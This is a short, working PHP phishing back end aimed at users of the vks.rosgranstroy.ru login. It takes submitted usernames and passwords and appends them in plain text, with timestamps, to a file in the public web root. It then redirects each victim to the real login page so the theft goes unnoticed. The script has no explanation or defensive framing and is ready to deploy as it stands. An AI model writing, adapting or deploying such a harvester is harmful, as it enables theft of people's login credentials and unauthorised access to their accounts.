<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["username"]) && isset($_POST["password"])) {
    $name = $_POST["username"];
    $password = $_POST["password"];

    file_put_contents("/var/www/html/vkslogin.txt", "Username: " . $name . " Password: " . $password . " Time: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

    header("Location: https://vks.rosgranstroy.ru/v2/login");
    exit();
}
?>